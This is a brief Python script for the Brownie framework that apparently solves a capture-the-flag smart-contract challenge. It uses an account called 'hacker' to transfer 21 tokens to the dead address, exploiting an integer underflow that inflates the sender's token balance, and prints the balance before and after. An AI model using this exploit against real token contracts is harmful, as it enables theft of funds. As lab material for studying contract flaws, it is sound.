from brownie import accounts, config, interface

def main(target):
    token = interface.TokenInterface(target)
    hacker = accounts.add(config['wallets']['from_key'])
    dead = "0x000000000000000000000000000000000000dead"
    print(f'Balance before: {token.balanceOf(hacker)}')
    tx = token.transfer(dead, 21, {'from': hacker, 'allow_revert': True})
    tx.wait(2)
    print(f'Balance after: {token.balanceOf(hacker)}')
